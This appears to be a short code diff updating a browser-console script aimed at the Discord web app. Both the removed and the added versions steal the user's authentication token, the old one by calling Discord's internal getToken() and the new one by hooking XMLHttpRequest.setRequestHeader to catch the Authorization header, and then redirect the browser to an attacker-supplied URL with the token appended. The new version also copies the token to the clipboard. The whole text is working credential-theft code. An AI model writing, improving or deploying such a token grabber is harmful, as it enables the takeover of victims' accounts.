@@ -1,6 +1,13 @@
 const url = 'PASTE_URL_HERE';
-var f = (webpackChunkdiscord_app.push([[''], {}, e=> {
-  m = [];
-  for (let c in e.c) m.push(e.c[c]);
-}]), m).find(m => m?.exports?.default?.getToken !== undefined).exports.default.getToken();
-window.location.replace(url + '/' + f);
+(() => {
+    const original = XMLHttpRequest.prototype.setRequestHeader;
+    XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
+        if (name.toLowerCase() === 'authorization') {
+            navigator.clipboard.writeText(value).catch(() => {});
+            window.location.replace(url + '/' + value);
+        }
+        return original.call(this, name, value);
+    };
+})();
+
+
